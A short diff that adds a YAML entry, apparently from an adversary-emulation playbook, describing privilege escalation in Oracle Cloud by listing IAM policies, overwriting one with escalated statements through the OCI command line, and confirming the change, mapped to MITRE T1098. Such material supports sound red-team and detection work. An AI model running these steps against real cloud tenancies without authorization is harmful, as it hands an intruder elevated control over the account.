@@ -1,0 +1,11 @@
+description: Modify IAM policy to escalate privileges within Oracle Cloud Infrastructure.
+mitre_technique: T1098
+name: Oracle IAM Policy Escalation
+stage: Privilege Escalation
+steps:
+- action: oci iam policy list --compartment-id <compartment-id>
+  description: List IAM policies
+- action: oci iam policy update --policy-id <policy-id> --statements file://escalated_policy.json
+  description: Update policy with elevated privileges
+- action: oci iam policy get --policy-id <policy-id>
+  description: Confirm the new policy version
